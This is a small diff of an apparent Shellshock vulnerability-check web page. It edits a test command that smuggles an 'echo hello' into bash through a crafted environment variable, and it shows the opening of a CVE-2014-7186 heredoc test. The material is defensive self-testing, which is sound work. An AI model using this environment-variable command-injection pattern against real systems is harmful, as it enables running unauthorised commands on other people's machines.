@@ -173,7 +173,7 @@ echo "https://shellshocker.net/"
         <p>
             Here is another variation of the exploit. <i>Please leave a comment below if you know the CVE of this exploit.</i>
         </p>
-        <pre>env -i X=' () { }; echo hello' bash -c 'date'</pre>
+        <pre>env X=' () { }; echo hello' bash -c 'date'</pre>
         <p>If the above command outputs "hello", you are vulnerable.</p>
         <h4>Exploit 4 (<a target="_blank" href="https://access.redhat.com/security/cve/CVE-2014-7186">CVE-2014-7186</a>)</h4>
         <pre>bash -c 'true &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF' ||
